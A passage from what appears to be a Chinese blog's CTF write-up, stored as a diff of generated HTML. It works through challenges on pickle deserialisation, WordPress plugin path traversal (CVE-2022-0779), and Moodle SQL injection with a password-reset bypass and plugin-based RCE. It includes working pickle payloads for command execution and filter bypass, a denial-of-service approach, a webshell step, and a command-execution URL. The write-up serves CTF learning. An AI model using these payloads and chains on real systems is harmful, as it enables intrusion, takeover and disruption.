+        <span class="bp">self</span><span class="o">.</span><span class="n">username</span><span class="o">=</span><span class="n">username</span>
+        <span class="bp">self</span><span class="o">.</span><span class="n">token</span><span class="o">=</span><span class="nb">hash</span><span class="p">(</span><span class="n">password</span><span class="p">)</span>
+
+<span class="k">def</span> <span class="nf">get_password</span><span class="p">(</span><span class="n">username</span><span class="p">):</span>
+    <span class="k">if</span> <span class="n">username</span><span class="o">==</span><span class="s2">&#34;admin&#34;</span><span class="p">:</span>
+        <span class="k">return</span> <span class="n">admin</span><span class="o">.</span><span class="n">secret</span>
+    <span class="k">else</span><span class="p">:</span>
+        <span class="c1"># conn=sqlite3.connect(&#34;user.db&#34;)</span>
+        <span class="c1"># cursor=conn.cursor()</span>
+        <span class="c1"># cursor.execute(f&#34;select password from usertable where username=&#39;{username}&#39;&#34;)</span>
+        <span class="c1"># data=cursor.fetchall()[0]</span>
+        <span class="c1"># if data:</span>
+        <span class="c1">#     return data[0] </span>
+        <span class="c1"># else:</span>
+        <span class="c1">#     return None</span>
+        <span class="k">return</span> <span class="n">session</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="s2">&#34;password&#34;</span><span class="p">)</span>
+
+<span class="nd">@app</span><span class="o">.</span><span class="n">route</span><span class="p">(</span><span class="s1">&#39;/balancer&#39;</span><span class="p">,</span> <span class="n">methods</span><span class="o">=</span><span class="p">[</span><span class="s1">&#39;GET&#39;</span><span class="p">,</span> <span class="s1">&#39;POST&#39;</span><span class="p">])</span>
+<span class="k">def</span> <span class="nf">flag</span><span class="p">():</span>
+    <span class="n">pickle_data</span><span class="o">=</span><span class="n">base64</span><span class="o">.</span><span class="n">b64decode</span><span class="p">(</span><span class="n">request</span><span class="o">.</span><span class="n">cookies</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="s2">&#34;userdata&#34;</span><span class="p">))</span>
+    <span class="k">if</span> <span class="sa">b</span><span class="s1">&#39;R&#39;</span> <span class="ow">in</span> <span class="n">pickle_data</span> <span class="ow">or</span> <span class="sa">b</span><span class="s2">&#34;secret&#34;</span> <span class="ow">in</span> <span class="n">pickle_data</span><span class="p">:</span>
+        <span class="k">return</span> <span class="s2">&#34;You damm hacker!&#34;</span>
+    <span class="n">os</span><span class="o">.</span><span class="n">system</span><span class="p">(</span><span class="s2">&#34;rm -rf *py*&#34;</span><span class="p">)</span>
+    <span class="n">userdata</span><span class="o">=</span><span class="n">pickle</span><span class="o">.</span><span class="n">loads</span><span class="p">(</span><span class="n">pickle_data</span><span class="p">)</span>
+    <span class="k">if</span> <span class="n">userdata</span><span class="o">.</span><span class="n">token</span><span class="o">!=</span><span class="nb">hash</span><span class="p">(</span><span class="n">get_password</span><span class="p">(</span><span class="n">userdata</span><span class="o">.</span><span class="n">username</span><span class="p">)):</span>
+         <span class="k">return</span> <span class="s2">&#34;Login First&#34;</span>
+    <span class="k">if</span> <span class="n">userdata</span><span class="o">.</span><span class="n">username</span><span class="o">==</span><span class="s1">&#39;admin&#39;</span><span class="p">:</span>
+        <span class="k">return</span> <span class="s2">&#34;Welcome admin, here is your next challenge!&#34;</span>
+    <span class="k">return</span> <span class="s2">&#34;You&#39;re not admin!&#34;</span>
+
+<span class="nd">@app</span><span class="o">.</span><span class="n">route</span><span class="p">(</span><span class="s1">&#39;/login&#39;</span><span class="p">,</span> <span class="n">methods</span><span class="o">=</span><span class="p">[</span><span class="s1">&#39;GET&#39;</span><span class="p">,</span> <span class="s1">&#39;POST&#39;</span><span class="p">])</span>
+<span class="k">def</span> <span class="nf">login</span><span class="p">():</span>
+    <span class="n">resp</span> <span class="o">=</span> <span class="n">make_response</span><span class="p">(</span><span class="s2">&#34;success&#34;</span><span class="p">)</span> 
+    <span class="n">session</span><span class="p">[</span><span class="s2">&#34;password&#34;</span><span class="p">]</span><span class="o">=</span><span class="n">request</span><span class="o">.</span><span class="n">values</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="s2">&#34;password&#34;</span><span class="p">)</span>
+    <span class="n">resp</span><span class="o">.</span><span class="n">set_cookie</span><span class="p">(</span><span class="s2">&#34;userdata&#34;</span><span class="p">,</span> <span class="n">base64</span><span class="o">.</span><span class="n">b64encode</span><span class="p">(</span><span class="n">pickle</span><span class="o">.</span><span class="n">dumps</span><span class="p">(</span><span class="n">User</span><span class="p">(</span><span class="n">request</span><span class="o">.</span><span class="n">values</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="s2">&#34;username&#34;</span><span class="p">),</span><span class="n">request</span><span class="o">.</span><span class="n">values</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="s2">&#34;password&#34;</span><span class="p">)),</span><span class="mi">2</span><span class="p">)),</span> <span class="n">max_age</span><span class="o">=</span><span class="mi">3600</span><span class="p">)</span>
+    <span class="k">return</span> <span class="n">resp</span>
+
+<span class="nd">@app</span><span class="o">.</span><span class="n">route</span><span class="p">(</span><span class="s1">&#39;/&#39;</span><span class="p">,</span> <span class="n">methods</span><span class="o">=</span><span class="p">[</span><span class="s1">&#39;GET&#39;</span><span class="p">,</span> <span class="s1">&#39;POST&#39;</span><span class="p">])</span>
+<span class="k">def</span> <span class="nf">index</span><span class="p">():</span>
+    <span class="k">return</span> <span class="nb">open</span><span class="p">(</span><span class="s1">&#39;source.txt&#39;</span><span class="p">,</span><span class="s2">&#34;r&#34;</span><span class="p">)</span><span class="o">.</span><span class="n">read</span><span class="p">()</span>
+
+<span class="k">if</span> <span class="vm">__name__</span> <span class="o">==</span> <span class="s1">&#39;__main__&#39;</span><span class="p">:</span>
+    <span class="n">app</span><span class="o">.</span><span class="n">run</span><span class="p">(</span><span class="n">host</span><span class="o">=</span><span class="s1">&#39;0.0.0.0&#39;</span><span class="p">,</span> <span class="n">port</span><span class="o">=</span><span class="mi">5000</span><span class="p">)</span>
+</code></pre></td></tr></table>
+</div>
+</div><p>login路由创建session和userdata</p>
+<p>这里balancer路由检测到pickle数据里没有R和secret后就会解pickle，所以这里是可以直接rce的，只要绕R就行了，比如这里的i</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback">(S&#39;whoami&#39;
+ios
+system
+.
+</code></pre></td></tr></table>
+</div>
+</div><h2 id="非预期">非预期</h2>
+<p>题目只要求构造504就有flag，那么就不一定得按题目走下去，所以我这里应该是非预期了，我让这个会话sleep一段时间，多发几个包，服务器就会受不了了</p>
+<p><img src="https://tuchuang.huamang.xyz/img/image-20220802161853201.png"
+	
+	
+	
+	loading="lazy"
+	
+		alt="image-20220802161853201"
+	
+	
+></p>
+<h2 id="预期">预期</h2>
+<p>预期就是走题目的逻辑，他会判断secret是否匹配，但是这里是secret是未知的</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback">if userdata.token!=hash(get_password(userdata.username)):
+     return &#34;Login First&#34;
+if userdata.username==&#39;admin&#39;:
+     return &#34;Welcome admin, here is your next challenge!&#34;
+     
+
+def get_password(username):
+    if username==&#34;admin&#34;:
+        return admin.secret
+    else:
+        # conn=sqlite3.connect(&#34;user.db&#34;)
+        # cursor=conn.cursor()
+        # cursor.execute(f&#34;select password from usertable where username=&#39;{username}&#39;&#34;)
+        # data=cursor.fetchall()[0]
+        # if data:
+        #     return data[0] 
+        # else:
+        #     return None
+        return session.get(&#34;password&#34;)
+</code></pre></td></tr></table>
+</div>
+</div><p>这题有点像：<strong>高校战疫网络安全分享赛:webtmp</strong>，做法就是覆盖掉secret绕过验证，只不过这里对secret关键词进行了过滤，解决办法是unicode编码</p>
+<p><img src="https://tuchuang.huamang.xyz/img/image-20220802211532387.png"
+	
+	
+	
+	loading="lazy"
+	
+		alt="image-20220802211532387"
+	
+	
+></p>
+<p>这里看到nu1l的wp，发现可以直接hex绕，也是可以的</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback">b&#39;&#39;&#39;capp
+admin
+(S&#39;\\x73ecret&#39;
+S&#39;1&#39;
+db.&#39;&#39;&#39;
+</code></pre></td></tr></table>
+</div>
+</div><p>进去就可以修改负载均衡的配置了</p>
+<h1 id="wp-um">WP-UM</h1>
+<p>一进去就是一个安装</p>
+<p><img src="https://tuchuang.huamang.xyz/img/image-20220802211909442.png"
+	
+	
+	
+	loading="lazy"
+	
+		alt="image-20220802211909442"
+	
+	
+></p>
+<p>账号密码放在根目录下了，这就很刻意的让我们去目录遍历去找账号密码了</p>
+<p>他提到了危险出插件，题目给了源码，我们直接进去看看装了什么插件</p>
+<p><img src="https://tuchuang.huamang.xyz/img/image-20220802212048525.png"
+	
+	
+	
+	loading="lazy"
+	
+		alt="image-20220802212048525"
+	
+	
+></p>
+<p>这个user-meta搜了一下，确实存在一个目录遍历的漏洞，看一下版本正好对上，是CVE-2022-0779</p>
+<p><a class="link" href="https://skynettools.com/wordpress-user-meta-lite-and-pro-2-4-3-vulnerable-to-path-traversal-exploit/"  target="_blank" rel="noopener"
+    >https://skynettools.com/wordpress-user-meta-lite-and-pro-2-4-3-vulnerable-to-path-traversal-exploit/</a></p>
+<p><img src="https://tuchuang.huamang.xyz/img/image-20220802212130667.png"
+	
+	
+	
+	loading="lazy"
+	
+		alt="image-20220802212130667"
+	
+	
+></p>
+<p>成功探测到</p>
+<p><img src="https://tuchuang.huamang.xyz/img/image-20220802212159514.png"
+	
+	
+	
+	loading="lazy"
+	
+		alt="image-20220802212159514"
+	
+	
+></p>
+<p><img src="https://tuchuang.huamang.xyz/img/image-20220802212212148.png"
+	
+	
+	
+	loading="lazy"
+	
+		alt="image-20220802212212148"
+	
+	
+></p>
+<p>这样探测出用户名密码：<code>MaoGePaMao:MaoGeYaoQiFeiLa</code></p>
+<p>进到后台，在外观编辑处可以直接编辑php代码，直接写php木马</p>
+<p><img src="https://tuchuang.huamang.xyz/img/image-20220802212321699.png"
+	
+	
+	
+	loading="lazy"
+	
+		alt="image-20220802212321699"
+	
+	
+></p>
+<p>进蚁剑翻了很久很久翻到了flag。。。</p>
+<p><img src="https://tuchuang.huamang.xyz/img/image-20220802212427630.png"
+	
+	
+	
+	loading="lazy"
+	
+		alt="image-20220802212427630"
+	
+	
+></p>
+<h1 id="easylogin">easylogin</h1>
+<p>wordpress这个版本存在sql注入，这里进行报错注入测试</p>
+<p><a class="link" href="https://www.freebuf.com/articles/web/321297.html"  target="_blank" rel="noopener"
+    >https://www.freebuf.com/articles/web/321297.html</a></p>
+<p>报错注入成功</p>
+<p><img src="https://tuchuang.huamang.xyz/img/image-20220802212508676.png"
+	
+	
+	
+	loading="lazy"
+	
+		alt="image-20220802212508676"
+	
+	
+></p>
+<p>直接sqlmap嗦</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span><span class="lnt">22
+</span><span class="lnt">23
+</span><span class="lnt">24
+</span><span class="lnt">25
+</span><span class="lnt">26
+</span><span class="lnt">27
+</span><span class="lnt">28
+</span><span class="lnt">29
+</span><span class="lnt">30
+</span><span class="lnt">31
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback">---
+web server operating system: Linux Ubuntu 20.04 or 19.10 (focal or eoan)
+web application technology: Apache 2.4.41
+back-end DBMS: MySQL &gt;= 5.0 (MariaDB fork)
+Database: moodle
+[428 tables]
++----------------------------------+
+| mdl_analytics_indicator_calc     |
+| mdl_analytics_models             |
+| mdl_analytics_models_log         |
+   。。。。。。。。。。。。。。。。。
+| mdl_tool_recyclebin_category     |
+| mdl_tool_recyclebin_course       |
+| mdl_tool_usertours_steps         |
+| mdl_tool_usertours_tours         |
+| mdl_upgrade_log                  |
+| mdl_url                          |
+| mdl_user                         |
+| mdl_user_devices                 |
+| mdl_user_enrolments              |
+| mdl_user_info_category           |
+| mdl_user_info_data               |
+| mdl_user_info_field              |
+| mdl_user_lastaccess              |
+| mdl_user_password_history        |
+| mdl_user_password_resets         |
+| mdl_user_preferences             |
+| mdl_user_private_key             |
+|   .............
++----------------------------------+
+
+</code></pre></td></tr></table>
+</div>
+</div><p>这里本地搭建了一个moodle来调试</p>
+<p>这里前端只有一个功能点，就是重置密码，他会要求你写一个邮箱，然后发送修改密码的连接给你，所以我猜测是不是可以去构造这个链接，而且在dump出几个表来看，只有这个表mdl_user_password_resets存在一些数据</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span><span class="lnt">22
+</span><span class="lnt">23
+</span><span class="lnt">24
+</span><span class="lnt">25
+</span><span class="lnt">26
+</span><span class="lnt">27
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback">
+Database: moodle
+Table: mdl_user_password_history
+[0 entries]
++----+--------+------+-------------+
+| id | userid | hash | timecreated |
++----+--------+------+-------------+
++----+--------+------+-------------+
+
+
+Database: moodle
+Table: mdl_user_password_resets
+[1 entry]
++----+--------+----------------------------------+---------------+-----------------+
+| id | userid | token                            | timerequested | timererequested |
++----+--------+----------------------------------+---------------+-----------------+
+| 1  | 2      | OmPAvhUALIvcQcX4fSxx8P0BzcKcSoVG | 1659191821    | 1659191987      |
++----+--------+----------------------------------+---------------+--------------
+
+
+Database: moodle
+Table: mdl_user_private_key
+[0 entries]
++----+--------+--------+---------+----------+------------+-------------+---------------+
+| id | userid | script | value   | instance | validuntil | timecreated | iprestriction |
++----+--------+--------+---------+----------+------------+-------------+---------------+
++----+--------+--------+---------+----------+------------+-------------+---------------+
+</code></pre></td></tr></table>
+</div>
+</div><p>这里进行代码审计，首先在跟进这里</p>
+<p><img src="https://tuchuang.huamang.xyz/img/image-20220802212635605.png"
+	
+	
+	
+	loading="lazy"
+	
+		alt="image-20220802212635605"
+	
+	
+></p>
+<p>然后进到这里，这里会有个判断，必须保证token绑定了user，而且时间在半小时内</p>
+<p><img src="https://tuchuang.huamang.xyz/img/image-20220802213236052.png"
+	
+	
+	
+	loading="lazy"
+	
+		alt="image-20220802213236052"
+	
+	
+></p>
+<p>在本地环境测试下，我通过发送重置密码邮件，就可以更新mdl_user_password_resets里面的token和时间</p>
+<p>这里我直接盲测了一下，直接发只有token参数的数据，因为缺少参数，这里发现跳转到了修改密码的界面</p>
+<p><img src="https://tuchuang.huamang.xyz/img/image-20220802213250760.png"
+	
+	
+	
+	loading="lazy"
+	
+		alt="image-20220802213250760"
+	
+	
+></p>
+<p>手动修改密码后登录，本地环境成功登录admin</p>
+<p><img src="https://tuchuang.huamang.xyz/img/image-20220802213303997.png"
+	
+	
+	
+	loading="lazy"
+	
+		alt="image-20220802213303997"
+	
+	
+></p>
+<p>然后在history里面找到完整的payload，不过这个sesskey是有时限的，所以还是手改就好</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback">token=Lk7GF0p9gAinTlkPPyMA4ZJ9Hc6v6Fly&amp;sesskey=h9zVdXkSLf&amp;_qf__login_set_password_form=1&amp;username=admin&amp;password=Admin%40123&amp;password2=Admin%40123&amp;submitbutton=%E4%BF%9D%E5%AD%98%E6%9B%B4%E6%94%B9
+</code></pre></td></tr></table>
+</div>
+</div><p>然后到远程来打，首先sql注入拿到管理员的邮箱，这里找到的是admin@localhost.com</p>
+<p><img src="https://tuchuang.huamang.xyz/img/image-20220802213416029.png"
+	
+	
+	
+	loading="lazy"
+	
+		alt="image-20220802213416029"
+	
+	
+></p>
+<p>然后发包修改免密进入到后台</p>
+<p><img src="https://tuchuang.huamang.xyz/img/image-20220802213430881.png"
+	
+	
+	
+	loading="lazy"
+	
+		alt="image-20220802213430881"
+	
+	
+></p>
+<p>这个moodle版本是3.9.1，后台是可以getshell的，这里通过加载一个插件去getshell</p>
+<p>我用的现成的</p>
+<p><a class="link" href="https://github.com/HoangKien1020/Moodle_RCE"  target="_blank" rel="noopener"
+    >https://github.com/HoangKien1020/Moodle_RCE</a></p>
+<p>安装这个rce插件即可</p>
+<p><img src="https://tuchuang.huamang.xyz/img/image-20220802213443651.png"
+	
+	
+	
+	loading="lazy"
+	
+		alt="image-20220802213443651"
+	
+	
+></p>
+<p>然后find找flag即可</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback">http://47.105.52.19:8888/blocks/rce/lang/en/block_rce.php?cmd=grep -r &#39;flag{.*}&#39; /etc
+</code></pre></td></tr></table>
+</div>
+</div><p><img src="https://tuchuang.huamang.xyz/img/image-20220802213503580.png"
+	
+	
+	
+	loading="lazy"
+	
+		alt="image-20220802213503580"
+	
+	
+></p>
+
+</section>
+
+
+    <footer class="article-footer">
+    
+
+    
+    <section class="article-copyright">
+        <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-copyright" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <circle cx="12" cy="12" r="9" />
+  <path d="M14.5 9a3.5 4 0 1 0 0 6" />
+</svg>
+
+
+
+        <span>Licensed under CC BY-NC-SA 4.0</span>
+    </section>
+    </footer>
+
+
+    
+</article>
+
+    
+
+    
+
+<aside class="related-content--wrapper">
+    <h2 class="section-title">相关文章</h2>
+    <div class="related-content">
+        <div class="flex article-list--tile">
+            
+                
+<article class="">
+    <a href="/post/xyb2022/">
+        
+        
+
+        <div class="article-details">
+            <h2 class="article-title">[2022祥云杯] wp</h2>
+        </div>
+    </a>
+</article>
+
+            
+                
+<article class="">
+    <a href="/post/typhoonconctf2022/">
+        
+        
+
+        <div class="article-details">
+            <h2 class="article-title">[TyphoonCon CTF 2022] WP</h2>
+        </div>
+    </a>
+</article>
+
+            
+                
+<article class="">
+    <a href="/post/ciscn2022_half/">
+        
+        
+
+        <div class="article-details">
+            <h2 class="article-title">[CISCN2022] Semifinals</h2>
+        </div>
+    </a>
+</article>
+
+            
+                
+<article class="">
+    <a href="/post/ciscn2022_crt/">
+        
+        
+
+        <div class="article-details">
+            <h2 class="article-title">[CISCN2022] online_crt</h2>
+        </div>
+    </a>
+</article>
+
+            
+                
+<article class="">
+    <a href="/post/2022dasctf%E5%9B%9B%E6%9C%88%E8%B5%9B_wp/">
+        
+        
+
+        <div class="article-details">
+            <h2 class="article-title">[2022DASCTF Apr X FATE 防疫挑战赛] WP</h2>
+        </div>
+    </a>
+</article>
+
+            
+        </div>
+    </div>
+</aside>
+
+     
+    
+        
+    
+
+    <footer class="site-footer">
+    <section class="copyright">
+        &copy; 
+        
+            2020 - 
+        
+        2022 Huamang
+    </section>
+    
+    <section class="powerby">
+        Built with <a href="https://gohugo.io/" target="_blank" rel="noopener">Hugo</a> <br />
+        <span id="busuanzi_container_page_pv"> 阅读量 <span id="busuanzi_value_page_pv"></span> 次 </span>
+        <br>
+        
+        <span class="icp"><a href="https://beian.miit.gov.cn/" target="_blank">赣ICP备2021001334号</a></span>
+    </section>
+</footer>
+
+
+    
+<div class="pswp" tabindex="-1" role="dialog" aria-hidden="true">
+
+    
+    <div class="pswp__bg"></div>
+
+    
+    <div class="pswp__scroll-wrap">
+
+        
+        <div class="pswp__container">
+            <div class="pswp__item"></div>
+            <div class="pswp__item"></div>
+            <div class="pswp__item"></div>
+        </div>
+
+        
+        <div class="pswp__ui pswp__ui--hidden">
+
+            <div class="pswp__top-bar">
+
+                
+
+                <div class="pswp__counter"></div>
+
+                <button class="pswp__button pswp__button--close" title="Close (Esc)"></button>
+
+                <button class="pswp__button pswp__button--share" title="Share"></button>
+
+                <button class="pswp__button pswp__button--fs" title="Toggle fullscreen"></button>
+
+                <button class="pswp__button pswp__button--zoom" title="Zoom in/out"></button>
+
+                
+                
+                <div class="pswp__preloader">
+                    <div class="pswp__preloader__icn">
+                        <div class="pswp__preloader__cut">
+                            <div class="pswp__preloader__donut"></div>
+                        </div>
+                    </div>
+                </div>
+            </div>
+
+            <div class="pswp__share-modal pswp__share-modal--hidden pswp__single-tap">
+                <div class="pswp__share-tooltip"></div>
+            </div>
+
+            <button class="pswp__button pswp__button--arrow--left" title="Previous (arrow left)">
+            </button>
+
+            <button class="pswp__button pswp__button--arrow--right" title="Next (arrow right)">
+            </button>
+
+            <div class="pswp__caption">
+                <div class="pswp__caption__center"></div>
+            </div>
+
+        </div>
+
+    </div>
+
+</div><script 
+                src="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe.min.js"integrity="sha256-ePwmChbbvXbsO02lbM3HoHbSHTHFAeChekF1xKJdleo="crossorigin="anonymous"
+                defer
+                >
+            </script><script 
+                src="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe-ui-default.min.js"integrity="sha256-UKkzOn/w1mBxRmLLGrSeyB4e1xbrp4xylgAWb3M42pU="crossorigin="anonymous"
+                defer
+                >
+            </script><link 
+                rel="stylesheet" 
+                href="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/default-skin/default-skin.min.css"crossorigin="anonymous"
+            ><link 
+                rel="stylesheet" 
+                href="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe.min.css"crossorigin="anonymous"
+            >
+
+            </main>
+        </div>
+        <script 
+                src="https://cdn.jsdelivr.net/npm/node-vibrant@3.1.6/dist/vibrant.min.js"integrity="sha256-awcR2jno4kI5X0zL8ex0vi2z&#43;KMkF24hUW8WePSA9HM="crossorigin="anonymous"
+                
+                >
+            </script><script type="text/javascript" src="/ts/main.js" defer></script>
+<script>
+    (function () {
+        const customFont = document.createElement('link');
+        customFont.href = "https://fonts.googleapis.com/css2?family=Lato:wght@300;400;700&display=swap";
+
+        customFont.type = "text/css";
+        customFont.rel = "stylesheet";
+
+        document.head.appendChild(customFont);
+    }());
+</script>
+<script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js">
+</script>
+    </body>
+</html>
